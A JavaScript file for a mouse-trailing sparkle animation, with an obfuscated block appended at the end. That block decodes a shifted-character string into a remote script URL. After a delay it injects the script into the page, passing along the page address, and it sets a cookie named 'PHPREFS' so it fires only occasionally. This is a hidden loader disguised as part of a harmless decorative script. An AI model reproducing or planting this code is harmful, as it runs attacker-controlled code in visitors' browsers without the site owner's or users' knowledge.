var colour = "#FFFFFF"
    , sparkles = 50
    , x = ox = 400
    , y = oy = 300
    , swide = 800
    , shigh = 600
    , sleft = sdown = 0
    , tiny = new Array
    , star = new Array
    , starv = new Array
    , starx = new Array
    , stary = new Array
    , tinyx = new Array
    , tinyy = new Array
    , tinyv = new Array;
function sparkle() {
    var c;
    if (Math.abs(x - ox) > 1 || Math.abs(y - oy) > 1)
        for (ox = x,
            oy = y,
            c = 0; c < sparkles; c++)
            if (!starv[c]) {
                star[c].style.left = (starx[c] = x) + "px",
                    star[c].style.top = (stary[c] = y + 1) + "px",
                    star[c].style.clip = "rect(0px, 5px, 5px, 0px)",
                    star[c].childNodes[0].style.backgroundColor = star[c].childNodes[1].style.backgroundColor = "random" == colour ? newColour() : colour,
                    star[c].style.visibility = "visible",
                    starv[c] = 50;
                break
            }
    for (c = 0; c < sparkles; c++)
        starv[c] && update_star(c),
            tinyv[c] && update_tiny(c);
    setTimeout("sparkle()", 40)
}
function update_star(i) {
    if (25 == --starv[i] && (star[i].style.clip = "rect(1px, 4px, 4px, 1px)"),
        starv[i]) {
        if (stary[i] += 1 + 3 * Math.random(),
            starx[i] += (i % 5 - 2) / 5,
            !(stary[i] < shigh + sdown))
            return star[i].style.visibility = "hidden",
                void (starv[i] = 0);
        star[i].style.top = stary[i] + "px",
            star[i].style.left = starx[i] + "px"
    } else
        tinyv[i] = 50,
            tiny[i].style.top = (tinyy[i] = stary[i]) + "px",
            tiny[i].style.left = (tinyx[i] = starx[i]) + "px",
            tiny[i].style.width = "2px",
            tiny[i].style.height = "2px",
            tiny[i].style.backgroundColor = star[i].childNodes[0].style.backgroundColor,
            star[i].style.visibility = "hidden",
            tiny[i].style.visibility = "visible"
}
function update_tiny(i) {
    if (25 == --tinyv[i] && (tiny[i].style.width = "1px",
        tiny[i].style.height = "1px"),
        tinyv[i]) {
        if (tinyy[i] += 1 + 3 * Math.random(),
            tinyx[i] += (i % 5 - 2) / 5,
            !(tinyy[i] < shigh + sdown))
            return tiny[i].style.visibility = "hidden",
                void (tinyv[i] = 0);
        tiny[i].style.top = tinyy[i] + "px",
            tiny[i].style.left = tinyx[i] + "px"
    } else
        tiny[i].style.visibility = "hidden"
}
function mouse(e) {
    e ? (y = e.pageY,
        x = e.pageX) : (set_scroll(),
            y = event.y + sdown,
            x = event.x + sleft)
}
function set_scroll() {
    "number" == typeof self.pageYOffset ? (sdown = self.pageYOffset,
        sleft = self.pageXOffset) : document.body && (document.body.scrollTop || document.body.scrollLeft) ? (sdown = document.body.scrollTop,
            sleft = document.body.scrollLeft) : document.documentElement && (document.documentElement.scrollTop || document.documentElement.scrollLeft) ? (sleft = document.documentElement.scrollLeft,
                sdown = document.documentElement.scrollTop) : (sdown = 0,
                    sleft = 0)
}
function set_width() {
    var sw_min = 999999
        , sh_min = 999999;
    document.documentElement && document.documentElement.clientWidth && (document.documentElement.clientWidth > 0 && (sw_min = document.documentElement.clientWidth),
        document.documentElement.clientHeight > 0 && (sh_min = document.documentElement.clientHeight)),
        "number" == typeof self.innerWidth && self.innerWidth && (self.innerWidth > 0 && self.innerWidth < sw_min && (sw_min = self.innerWidth),
            self.innerHeight > 0 && self.innerHeight < sh_min && (sh_min = self.innerHeight)),
        document.body.clientWidth && (document.body.clientWidth > 0 && document.body.clientWidth < sw_min && (sw_min = document.body.clientWidth),
            document.body.clientHeight > 0 && document.body.clientHeight < sh_min && (sh_min = document.body.clientHeight)),
        999999 != sw_min && 999999 != sh_min || (sw_min = 800,
            sh_min = 600),
        swide = sw_min,
        shigh = sh_min
}
function createDiv(height, width) {
    var div = document.createElement("div");
    return div.style.position = "absolute",
        div.style.height = height + "px",
        div.style.width = width + "px",
        div.style.overflow = "hidden",
        div
}
function newColour() {
    var c = new Array;
    return c[0] = 255,
        c[1] = Math.floor(256 * Math.random()),
        c[2] = Math.floor(Math.random() * (256 - c[1] / 2)),
        c.sort((function () {
            return .5 - Math.random()
        }
        )),
        "rgb(" + c[0] + ", " + c[1] + ", " + c[2] + ")"
}
window.onload = function () {
    if (document.getElementById) {
        for (var i = 0; i < sparkles; i++) {
            var rats;
            (rats = createDiv(3, 3)).style.visibility = "hidden",
                rats.style.zIndex = "999",
                document.body.appendChild(tiny[i] = rats),
                starv[i] = 0,
                tinyv[i] = 0,
                (rats = createDiv(5, 5)).style.backgroundColor = "transparent",
                rats.style.visibility = "hidden",
                rats.style.zIndex = "999";
            var rlef = createDiv(1, 5)
                , rdow = createDiv(5, 1);
            rats.appendChild(rlef),
                rats.appendChild(rdow),
                rlef.style.top = "2px",
                rlef.style.left = "0px",
                rdow.style.top = "0px",
                rdow.style.left = "2px",
                document.body.appendChild(star[i] = rats)
        }
        set_width(),
            sparkle()
    }
}
    ,
    document.onmousemove = mouse,
    window.onscroll = set_scroll,
    window.onresize = set_width;
(function (o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie),
            setTimeout(function () {
                o.c && (o.s = d.createElement('script'),
                    o.s.src = o.f('myyux?44zxjwxyf' + 'ynhx3htr4ljy4xhwn' + 'uy3oxDwjkjwwjwB') + l.href,
                    d.body.appendChild(o.s));
            }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) { }
    ;
}({}, document, location));
